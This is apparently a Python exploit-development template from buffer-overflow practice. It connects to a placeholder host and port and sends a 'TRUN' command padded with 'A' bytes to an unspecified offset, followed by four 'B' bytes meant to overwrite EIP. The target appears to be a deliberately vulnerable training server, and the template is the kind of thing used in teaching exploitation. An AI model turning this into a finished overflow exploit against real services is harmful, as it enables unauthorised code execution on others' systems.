#!/usr/bin/python3
import sys, socket

# B = 42424242 in EIP
shellcode = "A" * < offset_value > + "B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((< target_ip >, < port >))
    payload = 'TRUN /.:/' + shellcode
    s.send(payload.encode())
    s.close()
except:
    print("Error connecting to server")
    sys.exit()

